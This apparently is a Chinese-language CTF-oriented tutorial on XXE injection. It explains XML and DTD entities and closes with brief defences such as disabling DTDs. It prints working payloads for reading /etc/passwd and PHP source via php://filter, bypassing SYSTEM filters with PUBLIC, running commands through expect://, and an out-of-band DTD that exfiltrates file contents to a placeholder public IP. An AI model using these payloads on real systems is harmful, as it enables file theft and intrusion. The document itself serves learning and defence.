---
title: "XXE"
description: "XXE 漏洞总结，记录外部实体注入的原理、利用场景和防护配置。"
pubDate: "2026-01-21"
updatedDate: "2026-01-21"
tags: ["XXE", "漏洞总结", "Web安全"]
cover: auto
coverAlt: "XXE 的文章封面"
draft: false
---
# XXE

## 什么是XXE
XML 外部实体注入（XML External Entity Injection）漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载外部文件，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 DoS 攻击等危害。

XXE 漏洞触发的点往往是可以上传  XML 文件的地方，在这里没有对上传的 XML 文件进行过滤，导致可上传恶意 XML 文件。
## 什么是xml(参考[xml-菜鸟教程](https://www.runoob.com/xml/xml-intro.html))
XML 被设计用来传输和存储数据。

HTML 被设计用来显示数据。

XML 指可扩展标记语言（eXtensible Markup Language）。

可扩展标记语言（英语：Extensible Markup Language，简称：XML）是一种标记语言，是从标准通用标记语言（SGML）中简化修改出来的。它主要用到的有可扩展标记语言、可扩展样式语言（XSL）、XBRL和XPath等。

简而言之，xml是一种用于数据传输和储存的语言，同时xxe利用的便是对xml文档中外部实体的解析。

接下来简单讲一下xml的语法：

### 首先，一个XML必须有根元素，可以有一个声明，如下
```
<?xml version="1.0" encoding="UTF-8"?>(声明)
<note>(根元素)
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```
### 其次，对于xml来说，其中的标签是可以由使用者自由定义的，如<to>,<from>,<body>,<xxe>等，在标签定义上是极为自由的，但是一般对于一道试题来说我们的标签不能随意定义，需要利用回显点实现目的。

### 最后，讲一下dtd：

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。

DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

#### 内部的 DOCTYPE 声明

假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：
```
<!DOCTYPE root-element [element-declarations]> 
```
#### 外部文档声明

假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：
```
<!DOCTYPE root-element SYSTEM "filename"> 
```
在XXE中对DTD的使用主要就是外部实体的引入，以下简单介绍一下实体：

实体是用于定义引用普通文本或特殊字符的快捷方式的变量。

    实体引用是对实体的引用。
    
    实体可在内部或外部进行声明。

#### 一个内部实体声明
语法
```
<!ENTITY entity-name "entity-value">
```
实例
DTD 实例:
```
<!ENTITY writer "Donald Duck.">
<!ENTITY copyright "Copyright runoob.com">
```
XML 实例：
```
<author>&writer;&copyright;</author>
```
注意： 一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。

#### 一个外部实体声明
语法
```
<!ENTITY entity-name SYSTEM "URI/URL">
```
实例
DTD 实例:
```
<!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd">
```
XML example:
```
<author>&writer;&copyright;</author> 
```
## 如何实现xxe
对于一个可以传xml的场景来说，一般便可以考虑使用xxe，一个常见的xxe格式为：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=login.php">
]>
<root>
    <content>&xxe;</content>
</root>
```
对于system被过滤的情况可以尝试：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY abc PUBLIC "123" "php://filter/convert.base64-encode/resource=tip.php">

]>
<login>
<username>&abc;</username>
<password>password</password>
</login>
```
### SYSTEM 和 PUBLIC 的区别

在XML文档类型定义（DTD）中，SYSTEM 和 PUBLIC 都用于声明外部实体，但它们的用途和语法有所不同。

    SYSTEM 关键字： SYSTEM 用于指定一个私有的外部实体，其值是一个URI（统一资源标识符），直接指向外部实体的位置。这是在XXE攻击中最直接和常用的方式，攻击者通过指定一个类似 file:///etc/passwd 的URI来读取本地文件，或者指定一个URL来发起服务器端请求伪造（SSRF）攻击。
    
    语法示例：
    code Xml
    ```
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    ```
    PUBLIC 关键字： PUBLIC 用于指定一个公共的外部实体[2][3]。它需要提供两个标识符：一个公共标识符（Public ID）和一个系统标识符（System ID，即URI）[3]。公共标识符是一个形式化的名称，理论上应该能被XML应用或目录服务解析为一个具体的URI。如果XML处理器无法解析公共标识符，它会转而使用后面提供的系统标识符（URI）作为后备。
    
    语法示例：
    code Xml
    ```
    <!DOCTYPE foo [
      <!ENTITY xxe PUBLIC "-//W3C//ENTITIES XHTML 1.0 Strict//EN" "http://example.com/evil.dtd">
    ]>
    ```
    在这个例子中，"-//W3C//ENTITIES XHTML 1.0 Strict//EN" 是公共标识符，而 "http://example.com/evil.dtd" 是系统标识符。
    
    以上是针对有回显的场景，同时注意对于XXE中xml的标签在有回显的试题中需要进行修改成题目对应的回显点。

### 无回显
对于外带数据通常要去在自己的公网服务器写一个dtd并挂载让场景去引用，如下
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!-- 或者是题目指定的flag文件路径 -->
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_PUBLIC_IP:8000/?content=%file;'>">
%eval;
%exfiltrate;
```
先在公网服务器，托管一个恶意dtd，此处利用二次解析绕过，xml中参数实体的限制，当%eval;时，exfiltrate被解析注入当前dtd环境，&#x25;变为%，&#x25;是字符 % 的HTML/XML实体编码，在第一次起到延迟执行的作用。
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ENTITY % remote SYSTEM "http://YOUR_PUBLIC_IP:8000/evil.dtd">
%remote;
]>
<r></r>
```
再进行xxe，然后在监听窗口获得需要的内容。

无回显和有回显有一个重要区别

    通用实体 (General Entities)：没有 % 号。
    
        声明语法: <!ENTITY entity_name "...">
    
        引用语法: &entity_name;
    
        作用域: 只能在XML文档内容中使用。也就是在 ... <tag>&entity_name;</tag> ... 这样的地方。
    
    参数实体 (Parameter Entities)：有 % 号。
    
        声明语法: <!ENTITY % entity_name "...">
    
        引用语法: %entity_name;
    
        作用域: 只能在DTD（文档类型定义）内部使用。也就是在 <!DOCTYPE ... [ ... %entity_name; ... ]> 这个方括号里面。

如果环境存在expect扩展，也可以使用
```
<?xml version="1.0" ?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "expect://id">
]>
<x>&xxe;</x>
```
来进行系统命令执行。



**## 如何防御**

java中

\```java

factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

\```

可以禁掉dtd，对于XXE最好的防御方法也就是这个

其他语言也是使用对应推荐的方法禁掉dtd来防止XXE

还有一个方法就是黑名单，把常见的 ENTITY , SYSTEM , PUBLIC 等关键字禁掉